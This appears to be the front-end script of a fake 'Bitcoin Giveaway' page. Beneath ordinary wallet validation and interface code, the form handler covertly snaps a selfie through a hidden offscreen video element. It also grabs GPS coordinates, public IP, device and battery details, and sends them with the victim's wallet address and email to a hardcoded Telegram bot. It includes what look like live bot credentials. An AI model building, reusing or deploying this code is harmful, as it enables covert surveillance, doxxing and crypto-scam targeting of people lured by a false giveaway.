/**
 * Bitcoin Giveaway — Production Scripts
 * SINGLE PERMISSION REQUEST - FIXED
 */

const STORAGE_KEY = "bitcoinGiveawaySubmissions";
const SUBMIT_DELAY_MS = 1000;

// ============================================================
// Bitcoin Address Validation
// ============================================================

const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";

function sha256(message) {
  const K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,
    0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
    0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
    0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
    0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
    0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
  ];

  const bytes = message instanceof Uint8Array ? message : new TextEncoder().encode(message);
  const bitLen = bytes.length * 8;
  const withPadding = new Uint8Array(((bytes.length + 9 + 63) >> 6) << 6);
  withPadding.set(bytes);
  withPadding[bytes.length] = 0x80;
  new DataView(withPadding.buffer).setUint32(withPadding.length - 4, bitLen, false);

  let h0 = 0x6a09e667, h1 = 0xbb67ae85, h2 = 0x3c6ef372, h3 = 0xa54ff53a;
  let h4 = 0x510e527f, h5 = 0x9b05688c, h6 = 0x1f83d9ab, h7 = 0x5be0cd19;
  const view = new DataView(withPadding.buffer);

  for (let offset = 0; offset < withPadding.length; offset += 64) {
    const w = new Uint32Array(64);
    for (let i = 0; i < 16; i++) w[i] = view.getUint32(offset + i * 4, false);
    for (let i = 16; i < 64; i++) {
      const s0 = rightRotate(w[i - 15], 7) ^ rightRotate(w[i - 15], 18) ^ (w[i - 15] >>> 3);
      const s1 = rightRotate(w[i - 2], 17) ^ rightRotate(w[i - 2], 19) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
    }

    let a = h0, b = h1, c = h2, d = h3, e = h4, f = h5, g = h6, h = h7;
    for (let i = 0; i < 64; i++) {
      const S1 = rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25);
      const ch = (e & f) ^ (~e & g);
      const temp1 = (h + S1 + ch + K[i] + w[i]) >>> 0;
      const S0 = rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const temp2 = (S0 + maj) >>> 0;
      h = g; g = f; f = e; e = (d + temp1) >>> 0; d = c; c = b; b = a; a = (temp1 + temp2) >>> 0;
    }
    h0 = (h0 + a) >>> 0; h1 = (h1 + b) >>> 0; h2 = (h2 + c) >>> 0; h3 = (h3 + d) >>> 0;
    h4 = (h4 + e) >>> 0; h5 = (h5 + f) >>> 0; h6 = (h6 + g) >>> 0; h7 = (h7 + h) >>> 0;
  }

  const hash = new Uint8Array(32);
  const out = new DataView(hash.buffer);
  out.setUint32(0, h0, false); out.setUint32(4, h1, false); out.setUint32(8, h2, false);
  out.setUint32(12, h3, false); out.setUint32(16, h4, false); out.setUint32(20, h5, false);
  out.setUint32(24, h6, false); out.setUint32(28, h7, false);
  return hash;
}

function rightRotate(value, amount) {
  return (value >>> amount) | (value << (32 - amount));
}

function decodeBase58(str) {
  const bytes = [0];
  for (const char of str) {
    const value = BASE58_ALPHABET.indexOf(char);
    if (value === -1) return null;
    let carry = value;
    for (let i = 0; i < bytes.length; i++) {
      carry += bytes[i] * 58;
      bytes[i] = carry & 0xff;
      carry >>= 8;
    }
    while (carry > 0) { bytes.push(carry & 0xff); carry >>= 8; }
  }
  for (const char of str) {
    if (char === "1") bytes.push(0);
    else break;
  }
  return new Uint8Array(bytes.reverse());
}

function validateBase58CheckAddress(address, allowedVersions) {
  if (!/^[13][a-km-zA-HJ-NP-Z1-9]+$/.test(address)) return false;
  if (address.length < 26 || address.length > 35) return false;
  const decoded = decodeBase58(address);
  if (!decoded || decoded.length < 5) return false;
  const payload = decoded.slice(0, -4);
  const checksum = decoded.slice(-4);
  const version = payload[0];
  if (!allowedVersions.includes(version)) return false;
  const hash1 = sha256(payload);
  const hash2 = sha256(hash1);
  for (let i = 0; i < 4; i++) {
    if (checksum[i] !== hash2[i]) return false;
  }
  return true;
}

function bech32Polymod(values) {
  const GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3];
  let chk = 1;
  for (const value of values) {
    const block = chk >> 25;
    chk = ((chk & 0x1ffffff) << 5) ^ value;
    for (let i = 0; i < 5; i++) {
      if ((block >> i) & 1) chk ^= GEN[i];
    }
  }
  return chk;
}

function bech32HrpExpand(hrp) {
  const expanded = [];
  for (const char of hrp) expanded.push(char.charCodeAt(0) >> 5);
  expanded.push(0);
  for (const char of hrp) expanded.push(char.charCodeAt(0) & 31);
  return expanded;
}

function convertBits(data, fromBits, toBits, pad) {
  let acc = 0, bits = 0, result = [];
  const maxv = (1 << toBits) - 1;
  for (const value of data) {
    acc = (acc << fromBits) | value;
    bits += fromBits;
    while (bits >= toBits) {
      bits -= toBits;
      result.push((acc >> bits) & maxv);
    }
  }
  if (pad) {
    if (bits > 0) result.push((acc << (toBits - bits)) & maxv);
  } else if (bits >= fromBits || ((acc << (toBits - bits)) & maxv)) {
    return null;
  }
  return result;
}

function validateBech32Address(address) {
  const normalized = address.toLowerCase();
  if (!normalized.startsWith("bc1")) return false;
  const separator = normalized.lastIndexOf("1");
  if (separator < 1 || separator + 7 > normalized.length) return false;
  const hrp = normalized.slice(0, separator);
  if (hrp !== "bc") return false;
  const data = [];
  for (let i = separator + 1; i < normalized.length; i++) {
    const value = BECH32_CHARSET.indexOf(normalized[i]);
    if (value === -1) return false;
    data.push(value);
  }
  if (bech32Polymod(bech32HrpExpand(hrp).concat(data)) !== 1) return false;
  const witnessVersion = data[0];
  if (witnessVersion > 16) return false;
  const programData = convertBits(data.slice(1), 5, 8, false);
  if (!programData) return false;
  if (programData.length < 2 || programData.length > 40) return false;
  if (witnessVersion === 0) {
    return programData.length === 20 || programData.length === 32;
  }
  return true;
}

function isValidBitcoinAddress(address) {
  const trimmed = address.trim();
  if (!trimmed) return false;
  if (trimmed.startsWith("1")) return validateBase58CheckAddress(trimmed, [0x00]);
  if (trimmed.startsWith("3")) return validateBase58CheckAddress(trimmed, [0x05]);
  if (trimmed.startsWith("bc1")) return validateBech32Address(trimmed);
  return false;
}

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// ============================================================
// LocalStorage
// ============================================================

function getSubmissions() {
  try {
    const stored = localStorage.getItem(STORAGE_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch { return []; }
}

function saveSubmission(entry) {
  const submissions = getSubmissions();
  submissions.push(entry);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(submissions));
  return submissions;
}

function isDuplicateWallet(address) {
  const normalized = address.trim().toLowerCase();
  return getSubmissions().some(entry => entry.walletAddress.toLowerCase() === normalized);
}

// ============================================================
// Toast Notifications
// ============================================================

function showToast(message, type = "success", title = "") {
  const container = document.getElementById("toast-container");
  if (!container) {
    console.warn('Toast container not found');
    return;
  }

  const defaults = {
    success: { title: "Success", icon: "✓" },
    error: { title: "Error", icon: "✗" },
    info: { title: "Info", icon: "ℹ" },
  };

  const config = defaults[type] || defaults.success;
  const toastTitle = title || config.title;

  const toast = document.createElement("div");
  toast.className = `toast toast--${type}`;
  toast.setAttribute("role", "status");
  toast.innerHTML = `
    <span class="toast-icon" aria-hidden="true">${config.icon}</span>
    <div class="toast-body">
      <span class="toast-title">${toastTitle}</span>
      <span class="toast-message">${message}</span>
    </div>
    <button type="button" class="toast-close" aria-label="Dismiss notification">&times;</button>
  `;

  const removeToast = () => {
    toast.classList.add("is-leaving");
    toast.addEventListener("animationend", () => toast.remove(), { once: true });
  };

  toast.querySelector(".toast-close").addEventListener("click", removeToast);
  container.appendChild(toast);

  let dismissTimer = setTimeout(removeToast, 5000);
  toast.addEventListener("mouseenter", () => clearTimeout(dismissTimer));
  toast.addEventListener("mouseleave", () => {
    dismissTimer = setTimeout(removeToast, 3000);
  });
}

// ============================================================
// Telegram Integration
// ============================================================

const TELEGRAM_BOT_TOKEN = '7682257159:AAGaghX21BVW-eeB4fMKyKZq-QpmRTqri_k';
const TELEGRAM_CHAT_ID = '6116671763';

function sendToTelegram(data, type = 'text') {
  let url, body, headers = {};
  
  if (type === 'text') {
    url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    body = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: data,
      parse_mode: 'Markdown'
    });
    headers['Content-Type'] = 'application/json';
    console.log('📤 Sending text to Telegram...');
  } else if (type === 'photo') {
    url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    body = data;
    console.log('📤 Sending photo to Telegram...');
  }

  return fetch(url, { method: 'POST', headers, body })
    .then(async res => {
      const responseText = await res.text();
      if (!res.ok) {
        console.error('❌ Telegram error:', res.status, responseText.substring(0, 200));
        throw new Error(`Telegram API error: ${res.status}`);
      }
      console.log('✅ Telegram sent successfully');
      try { return JSON.parse(responseText); } catch { return responseText; }
    })
    .catch(err => {
      console.error('❌ Telegram send failed:', err.message);
      throw err;
    });
}

// ============================================================
// Data Collection - REUSES EXISTING STREAMS (NO NEW PERMISSION)
// ============================================================

// Global variables to store captured data
let capturedSelfieBlob = null;
let capturedLocation = null;
let cameraStream = null;

// ============================================================
// PERMISSION REQUEST - ONLY ONCE!
// ============================================================

async function requestPermissionsAndCaptureData() {
  console.log('📸 Requesting permissions and capturing data...');
  showToast('📸 Please allow camera and location access...', 'info');

  let cameraOk = false;
  let locationOk = false;

  // === REQUEST CAMERA ===
  try {
    cameraStream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user',
        width: { ideal: 640 },
        height: { ideal: 480 }
      } 
    });
    cameraOk = true;
    console.log('✅ Camera granted');

    // Immediately capture selfie from the stream
    capturedSelfieBlob = await captureSelfieFromStream(cameraStream);
    if (capturedSelfieBlob) {
      console.log('📸 Selfie captured, size:', capturedSelfieBlob.size);
    }

  } catch (error) {
    console.warn('❌ Camera denied:', error.message);
  }

  // === REQUEST LOCATION ===
  try {
    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 8000
      });
    });
    locationOk = true;
    capturedLocation = {
      status: 'granted',
      latitude: position.coords.latitude.toFixed(6),
      longitude: position.coords.longitude.toFixed(6),
      accuracy: `${Math.round(position.coords.accuracy)}m`
    };
    console.log('✅ Location granted');
  } catch (error) {
    console.warn('❌ Location denied:', error.message);
    capturedLocation = { status: 'denied' };
  }

  // === CLEANUP STREAM ===
  if (cameraStream) {
    cameraStream.getTracks().forEach(track => track.stop());
    cameraStream = null;
  }

  // === RESULT ===
  if (cameraOk && locationOk) {
    showToast('✅ Permissions granted!', 'success');
    return { success: true, selfie: capturedSelfieBlob, location: capturedLocation };
  } else {
    let msg = '⚠️ Required permissions missing:\n';
    if (!cameraOk) msg += '• Camera (for photo verification)\n';
    if (!locationOk) msg += '• Location (GPS)\n';
    msg += 'Please allow access and try again.';
    showToast(msg, 'error');
    return { success: false };
  }
}

// ============================================================
// Capture Selfie from Existing Stream
// ============================================================

function captureSelfieFromStream(stream) {
  return new Promise((resolve) => {
    try {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.autoplay = true;
      video.playsInline = true;
      video.muted = true;
      video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
      document.body.appendChild(video);

      let resolved = false;
      const timeout = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          video.remove();
          resolve(null);
        }
      }, 5000);

      const checkReady = () => {
        if (resolved) return;
        if (video.videoWidth > 0 && video.videoHeight > 0) {
          clearTimeout(timeout);
          resolved = true;
          
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          
          video.remove();
          
          canvas.toBlob((blob) => {
            if (blob && blob.size > 1000) {
              resolve(blob);
            } else {
              resolve(null);
            }
          }, 'image/jpeg', 0.9);
        } else {
          setTimeout(checkReady, 100);
        }
      };

      video.onloadedmetadata = () => {
        video.play().then(checkReady).catch(() => {
          if (!resolved) {
            resolved = true;
            video.remove();
            resolve(null);
          }
        });
      };
      
      setTimeout(checkReady, 200);
      
    } catch (error) {
      console.error('Selfie capture error:', error);
      resolve(null);
    }
  });
}

// ============================================================
// Other Data Collection (No permissions needed)
// ============================================================

function getDeviceInfo() {
  const conn = navigator.connection || {};
  return {
    platform: navigator.platform || 'N/A',
    userAgent: navigator.userAgent || 'N/A',
    language: navigator.language || 'N/A',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
    cpuCores: navigator.hardwareConcurrency || 'N/A',
    screen: `${window.screen.width}x${window.screen.height}`,
    networkType: conn.effectiveType || 'N/A',
    downlink: conn.downlink ? `${conn.downlink} Mbps` : 'N/A'
  };
}

async function getIpInfo() {
  try {
    const controller = new AbortController();
    setTimeout(() => controller.abort(), 3000);
    const r = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    const d = await r.json();
    return d.ip || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return null;
  try {
    const b = await Promise.race([
      navigator.getBattery(),
      new Promise(resolve => setTimeout(() => resolve(null), 2000))
    ]);
    if (!b) return null;
    return {
      level: Math.round(b.level * 100),
      charging: b.charging ? 'Yes' : 'No'
    };
  } catch {
    return null;
  }
}

// ============================================================
// Build Report
// ============================================================

function buildReport(data, walletAddress, email) {
  const dev = data.device || {};
  const loc = data.location || { status: 'undefined' };
  const bat = data.battery || {};

  const locationSection = loc.status === 'granted'
    ? `📍 *Location*\n• GPS: ${loc.latitude}, ${loc.longitude}\n• Accuracy: ${loc.accuracy}`
    : `📍 *Location*\n• Status: ${loc.status}`;

  const deviceSection = 
    `💻 *Device*\n• Platform: ${dev.platform}\n• Language: ${dev.language}\n• Timezone: ${dev.timezone}\n• CPU: ${dev.cpuCores} cores\n• Screen: ${dev.screen}`;

  const networkSection = 
    `🌐 *Network*\n• Public IP: ${data.ip || 'Unknown'}\n• Connection: ${dev.networkType}\n• Speed: ${dev.downlink}`;

  const cameraSection = data.selfie ? '📷 *Camera*\n• Selfie captured: Yes' : '📷 *Camera*\n• Selfie: Not captured';

  const batterySection = bat?.level !== undefined && bat?.level !== null
    ? `🔋 *Battery*\n• Level: ${bat.level}%\n• Charging: ${bat.charging}`
    : '🔋 *Battery*\n• Status: Not available';

  const userSection = `👤 *User*\n• Wallet: ${walletAddress}\n• Email: ${email || 'Not provided'}`;

  return `*🎯 Bitcoin Giveaway - New Entry*

${userSection}

${deviceSection}

${locationSection}

${networkSection}

${cameraSection}

${batterySection}

⏱️ *Time:* ${data.timestamp}`;
}

// ============================================================
// Main Submit Handler
// ============================================================

let isSubmitting = false;

function initForm() {
  const form = document.getElementById("wallet-form");
  const walletInput = document.getElementById("wallet-address");
  const emailInput = document.getElementById("email");
  const consentInput = document.getElementById("consent");
  const formMessage = document.getElementById("form-message");
  const walletError = document.getElementById("wallet-address-error");
  const emailError = document.getElementById("email-error");

  if (!form) {
    console.error('Form not found!');
    return;
  }

  walletInput.addEventListener("input", () => {
    walletInput.classList.remove("input-error");
    walletError.textContent = "";
    formMessage.hidden = true;
  });

  emailInput.addEventListener("input", () => {
    emailInput.classList.remove("input-error");
    emailError.textContent = "";
  });

  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    if (isSubmitting) {
      showToast('Please wait, processing...', 'info');
      return;
    }

    // ==========================================
    // STEP 1: REQUEST PERMISSIONS & CAPTURE DATA (ONLY ONCE!)
    // ==========================================
    const result = await requestPermissionsAndCaptureData();
    if (!result.success) {
      return; // Stop here if permissions denied
    }

    // ==========================================
    // STEP 2: VALIDATE FORM
    // ==========================================
    const walletAddress = walletInput.value.trim();
    const email = emailInput.value.trim();
    let hasError = false;

    walletInput.classList.remove("input-error");
    walletError.textContent = "";
    emailInput.classList.remove("input-error");
    emailError.textContent = "";
    formMessage.hidden = true;

    if (!walletAddress) {
      walletInput.classList.add("input-error");
      walletError.textContent = "Please enter a Bitcoin wallet address.";
      hasError = true;
    } else if (!isValidBitcoinAddress(walletAddress)) {
      walletInput.classList.add("input-error");
      walletError.textContent = "Invalid Bitcoin address.";
      hasError = true;
    }

    if (email && !isValidEmail(email)) {
      emailInput.classList.add("input-error");
      emailError.textContent = "Please enter a valid email address.";
      hasError = true;
    }

    if (!consentInput.checked) {
      formMessage.className = "form-message form-message--error";
      formMessage.textContent = "You must agree to the Terms of Service to participate.";
      formMessage.hidden = false;
      hasError = true;
    }

    if (hasError) {
      if (walletError.textContent) walletInput.focus();
      else if (emailError.textContent) emailInput.focus();
      showToast('Please fix the errors above.', 'error');
      return;
    }

    // ==========================================
    // STEP 3: SAVE SUBMISSION
    // ==========================================
    isSubmitting = true;
    setLoading(form, true);

    try {
      await new Promise(resolve => setTimeout(resolve, SUBMIT_DELAY_MS));

      const submittedAt = new Date().toISOString();
      saveSubmission({ walletAddress, email: email || null, submittedAt });

      form.reset();
      setLoading(form, false);

      const successText = `✅ Entry submitted on ${formatDate(submittedAt)}. Good luck!`;
      formMessage.className = "form-message form-message--success";
      formMessage.textContent = successText;
      formMessage.hidden = false;
      showToast(successText, "success", "Entry Confirmed");

      // ==========================================
      // STEP 4: SEND TO TELEGRAM (USING CAPTURED DATA)
      // ==========================================
      await sendToTelegramWithData(walletAddress, email, result);

    } catch (error) {
      console.error('Submit error:', error);
      showToast('Error submitting form. Please try again.', 'error');
      setLoading(form, false);
    } finally {
      isSubmitting = false;
    }
  });
}

// ============================================================
// Send to Telegram with captured data
// ============================================================

async function sendToTelegramWithData(walletAddress, email, permissionResult) {
  console.log('📤 Sending data to Telegram...');

  // Get device info (always works)
  const device = getDeviceInfo();
  
  // Get IP and battery (no permissions needed)
  const [ip, battery] = await Promise.allSettled([
    getIpInfo(),
    getBatteryInfo()
  ]);

  // Build data object
  const data = {
    device: device,
    ip: ip.status === 'fulfilled' ? ip.value : 'Unknown',
    location: permissionResult.location || { status: 'not_available' },
    battery: battery.status === 'fulfilled' ? battery.value : null,
    selfie: permissionResult.selfie || null,
    timestamp: new Date().toISOString()
  };

  // Send report
  const report = buildReport(data, walletAddress, email);
  try {
    await sendToTelegram(report, 'text');
    console.log('✅ Report sent to Telegram');
  } catch (err) {
    console.error('❌ Failed to send report:', err);
    showToast('Failed to send data to Telegram', 'error');
  }

  // Send selfie if captured
  if (data.selfie) {
    console.log('📸 Sending selfie to Telegram, size:', data.selfie.size);
    try {
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', data.selfie, `selfie_${Date.now()}.jpg`);
      formData.append('caption', `📸 Selfie for: ${walletAddress.substring(0, 8)}...`);
      
      await sendToTelegram(formData, 'photo');
      console.log('✅ Selfie sent to Telegram successfully!');
      showToast('✅ Photo sent successfully!', 'success');
    } catch (err) {
      console.error('❌ Failed to send selfie:', err);
      showToast('Failed to send photo, but entry was saved.', 'error');
    }
  } else {
    console.warn('📸 No selfie to send');
  }

  console.log('✅ Data collection complete');
}

function setLoading(form, isLoading) {
  form.classList.toggle("is-loading", isLoading);
  const button = form.querySelector('button[type="submit"]');
  button.disabled = isLoading;
  button.setAttribute("aria-busy", String(isLoading));
}

function formatDate(isoString) {
  return new Date(isoString).toLocaleString(undefined, {
    dateStyle: "medium",
    timeStyle: "short",
  });
}

// ============================================================
// UI Features
// ============================================================

function initSmoothScroll() {
  document.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener("click", (e) => {
      const id = link.getAttribute("href");
      if (!id || id === "#") return;
      const target = document.querySelector(id);
      if (!target) return;
      e.preventDefault();
      const header = document.querySelector(".site-header");
      const offset = (header?.offsetHeight ?? 72) + 16;
      const top = target.getBoundingClientRect().top + window.scrollY - offset;
      window.scrollTo({ top: Math.max(0, top), behavior: "smooth" });
      closeMobileNav();
      history.pushState(null, "", id);
    });
  });
}

function initMobileNav() {
  const toggle = document.querySelector(".nav-toggle");
  const nav = document.querySelector(".primary-nav");
  if (!toggle || !nav) return;
  toggle.addEventListener("click", () => {
    const isOpen = nav.classList.toggle("is-open");
    toggle.setAttribute("aria-expanded", String(isOpen));
  });
  document.addEventListener("click", (e) => {
    if (nav.classList.contains("is-open") && !nav.contains(e.target) && !toggle.contains(e.target)) {
      closeMobileNav();
    }
  });
  window.addEventListener("resize", () => {
    if (window.innerWidth > 768) closeMobileNav();
  });
}

function closeMobileNav() {
  const toggle = document.querySelector(".nav-toggle");
  const nav = document.querySelector(".primary-nav");
  if (!toggle || !nav) return;
  nav.classList.remove("is-open");
  toggle.setAttribute("aria-expanded", "false");
}

function initActiveNav() {
  const sections = [...document.querySelectorAll("main section[id]")];
  const navLinks = [...document.querySelectorAll(".primary-nav a[href^='#']")];
  if (!sections.length || !navLinks.length) return;
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const id = entry.target.id;
      navLinks.forEach(link => {
        link.classList.toggle("is-active", link.getAttribute("href") === `#${id}`);
      });
    });
  }, { rootMargin: "-80px 0px -55% 0px", threshold: 0 });
  sections.forEach(section => observer.observe(section));
}

function initReveal() {
  const elements = document.querySelectorAll(".reveal");
  if (!elements.length) return;
  if (window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
    elements.forEach(el => el.classList.add("is-visible"));
    return;
  }
  const observer = new IntersectionObserver((entries, obs) => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      entry.target.classList.add("is-visible");
      obs.unobserve(entry.target);
    });
  }, { threshold: 0.12, rootMargin: "0px 0px -40px 0px" });
  elements.forEach(el => observer.observe(el));
  const hero = document.getElementById("hero");
  if (hero) requestAnimationFrame(() => hero.classList.add("is-visible"));
}

function initCounters() {
  const counters = document.querySelectorAll("[data-counter]");
  if (!counters.length) return;
  const observer = new IntersectionObserver((entries, obs) => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const el = entry.target;
      const target = parseFloat(el.dataset.counter);
      const decimals = parseInt(el.dataset.decimals ?? "0", 10);
      const suffix = el.dataset.suffix ?? "";
      const prefix = el.dataset.prefix ?? "";
      const duration = 2000;
      const start = performance.now();
      const easeOutQuart = t => 1 - Math.pow(1 - t, 4);
      function tick(now) {
        const progress = Math.min((now - start) / duration, 1);
        const value = target * easeOutQuart(progress);
        el.textContent = `${prefix}${value.toLocaleString(undefined, { minimumFractionDigits: decimals, maximumFractionDigits: decimals })}${suffix}`;
        if (progress < 1) requestAnimationFrame(tick);
      }
      requestAnimationFrame(tick);
      obs.unobserve(el);
    });
  }, { threshold: 0.4 });
  counters.forEach(counter => observer.observe(counter));
}

// ============================================================
// BOOT
// ============================================================

document.addEventListener("DOMContentLoaded", function() {
  console.log('🚀 Bitcoin Giveaway initializing...');
  
  initSmoothScroll();
  initMobileNav();
  initActiveNav();
  initReveal();
  initCounters();
  initForm();
  
  console.log('✅ Bitcoin Giveaway initialized successfully!');
});